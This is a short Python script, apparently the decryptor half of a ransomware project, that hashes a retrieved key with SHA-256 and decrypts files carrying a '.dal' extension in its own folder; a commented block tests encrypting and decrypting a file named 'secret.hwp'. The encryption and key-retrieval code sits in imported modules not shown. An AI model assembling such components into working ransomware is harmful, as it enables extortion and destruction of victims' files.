import Search,hashlib
from RansomModule import *
from Get_data import *

password = bytes(get_key(),encoding="utf-8")
key = hashlib.sha256(password).digest()

default_path = os.path.dirname(os.path.realpath(__file__))
#default_path = "C:\\Users\\oonja\\Desktop\\Ransomware"
ext_list = [".dal"]
file,directory = Search.search(default_path,ext_list)

for i in file:
    decrypt_file(key,i)

print("Decrypted Finish!")

'''

in_filename = 'secret.hwp'
encrypt_file(key,in_filename)
print("Encrypted!")

decrypt_file(key,in_filename=in_filename+".enc")
print("Decrypted!")
'''
